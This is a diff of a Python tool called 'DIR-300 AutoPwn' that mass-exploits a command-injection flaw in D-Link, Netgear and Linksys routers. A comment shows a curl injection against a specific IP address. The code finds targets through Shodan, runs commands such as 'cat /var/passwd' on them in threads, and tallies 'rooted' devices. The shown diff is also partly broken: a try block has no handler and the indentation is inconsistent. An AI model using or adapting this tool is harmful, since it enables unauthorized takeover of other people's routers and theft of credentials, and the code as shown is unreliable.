@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- encoding: utf-8 -*-
 # DIR-300 AutoPwn
-# TODO: Check this
+#
 # D-Link DIR-615, DIR-600 и DIR-300 (rev B)
 # Netgear DGN1000B
 # Cisco Linksys E1500/E2500
@@ -11,9 +11,6 @@
 # curl --data "act=ping&dst=%26%20ls%26" http://217.162.11.253:8080/diagnostic.php
 #
 # author: @090h
-import urllib2
-import urllib
-import logging
 
 from Queue import Queue
 from threading import Thread
@@ -23,15 +20,17 @@ from pprint import pprint
 from shodan import WebAPI
 from sys import argv, stdout
 from base64 import encodestring
+from requests import get, post
+import logging
 
-SHODAN_API_KEY = None # Don't bother to register and get it.
+
 rooted = []
 
 
-class Dir300():
+class Dir300(object):
 
     firmware = None
-    info_urls = ['/router_info.xml', '/router_info.xml', '/DevInfo.txt', '/DevInfo.php']
+    info_urls = ['/router_info.xml', '/DevInfo.txt', '/DevInfo.php']
 
     def __init__(self, host, port=80):
         self.host = host
@@ -139,9 +138,9 @@ class DlinkThread(Thread):
                 self.queue.task_done()
 
 
-class DlinkManager():
+class DlinkManager(object):
 
-    def __init__(self, targets, cmd='cat /var/passwd', thread_count=5):
+    def __init__(self, targets, cmd='cat /var/passwd', thread_count=10):
         self.targets = targets
         self.thread_count = thread_count
         self.cmd = cmd
@@ -167,16 +166,22 @@ class DlinkManager():
             sleep(1)
         return
 
+def exploit(host, port=80):
+    d = Dir300(host, port)
+    print("INFO: %s\nFIRMWARE: %s\n" % (d.info, d.firmware))
+    print(d.command('cat /var/passwd'))
+    #print(d.command_blind('cat /var/passwd'))
 
-if __name__ == '__main__':
+def autoroot(api_key, thread_count=10):
 
-    if len(argv) == 1:
-        print('No args found, try to query Shodan...')
-        if SHODAN_API_KEY is None:
+        # Don't bother to register and get it.
+        api_key = raw_input("Shodan API Key: ")
+        if api_key is None or len(api_key) == 0:
             print('Go and get SHODAN_API_KEY at http://www.shodanhq.com/')
             exit()
 
-        api = WebAPI(SHODAN_API_KEY)
+        try:
+            api = WebAPI(api_key)
         search_queries = ['Server: Linux, HTTP/1.1, DIR','Mathopd/1.5p6' ]#, 'Server: Linux, HTTP/1.1, DIR-300']
         for query in search_queries:
             count = 0
@@ -184,7 +189,7 @@ if __name__ == '__main__':
             total = 0
 
             while True:
-                results = api.search(query) 
+                results = api.search(query)
                 if total == 0:
                     total = int(results['total'])
                     print('Results found: %s' % results['total'])
@@ -200,11 +205,17 @@ if __name__ == '__main__':
 
         print("Rooted routers count: %i"%len(rooted))
         print(rooted)
+
+if __name__ == '__main__':
+
+    if len(argv) == 1:
+        print('No args found, try to query Shodan...')
     else:
         port = 80
         if len(argv) > 2:
-            port = int(argv[2])
-        d = Dir300(argv[1],port)
-        print("INFO: %s\nFIRMWARE: %s\n" % (d.info, d.firmware))
-        print(d.command('cat /var/passwd'))
-        print(d.command_blind('cat /var/passwd'))
+            try:
+                port = int(argv[2])
+            except:
+                print('Invalid port: %s' % argv[2])
+                exit()
+        exploit(argv[1],port)
